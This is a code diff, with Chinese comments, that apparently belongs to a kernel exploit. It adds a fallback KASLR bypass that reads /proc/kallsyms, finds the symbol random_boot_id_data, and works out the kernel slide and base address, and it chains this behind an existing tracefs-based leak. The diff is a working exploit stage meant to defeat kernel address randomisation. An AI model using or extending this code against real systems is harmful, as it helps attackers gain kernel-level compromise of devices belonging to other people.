@@ -132,6 +132,57 @@ static int slide_tracefs_leak_kernel_base(void) {
   return 1;
 }
 
+// ========== 新增 bootid 实现 ==========
+static int slide_bootid_leak_kernel_base(void)
+{
+  // 通过已定义符号直接计算slide
+  uint64_t virt_bootid = 0;
+
+  // 读取 /proc/kallsyms 获取 random_boot_id_data 运行时虚拟地址
+  FILE *fp = fopen("/proc/kallsyms", "r");
+  if (!fp) {
+    pr_error("bootid: open /proc/kallsyms failed\n");
+    return 0;
+  }
+  char line[256];
+  while (fgets(line, sizeof(line), fp)) {
+    uint64_t addr;
+    char name[128];
+    if (sscanf(line, "%llx %*c %127s", &addr, name) == 2) {
+      if (strcmp(name, "random_boot_id_data") == 0) {
+        virt_bootid = addr;
+        break;
+      }
+    }
+  }
+  fclose(fp);
+
+  if (!virt_bootid) {
+    pr_error("bootid: cannot find random_boot_id_data symbol\n");
+    return 0;
+  }
+
+  uint64_t static_addr = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE;
+  uintptr_t candidate = virt_bootid - static_addr;
+
+  // 校验slide对齐（和原有规则保持一致 64k对齐）
+  if (candidate > 0x1f0000ULL || (candidate & 0xffffULL) != 0) {
+    pr_error("bootid: invalid candidate offset=%08zx\n", candidate);
+    return 0;
+  }
+
+  slide_p0_offset = candidate;
+  kaslr_base = KIMAGE_TEXT_BASE + candidate;
+  kaslr_slide = candidate;
+  kaslr_done = 1;
+
+  pr_success("slide-kaslr-ok source=bootid pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08zx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+}
+
 int slide_leak_kernel_base(void) {
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   if (forced_offset_arg && *forced_offset_arg) {
@@ -153,5 +204,13 @@ int slide_leak_kernel_base(void) {
                (unsigned long long)kaslr_slide, slide_p0_offset);
     return 1;
   }
-  return slide_tracefs_leak_kernel_base();
+
+#ifndef DISABLE_SLIDE_TRACEFS
+  if (slide_tracefs_leak_kernel_base()) {
+    return 1;
+  }
+  pr_warn("tracefs failed, fallback to bootid\n");
+#endif
+
+  return slide_bootid_leak_kernel_base();
 }
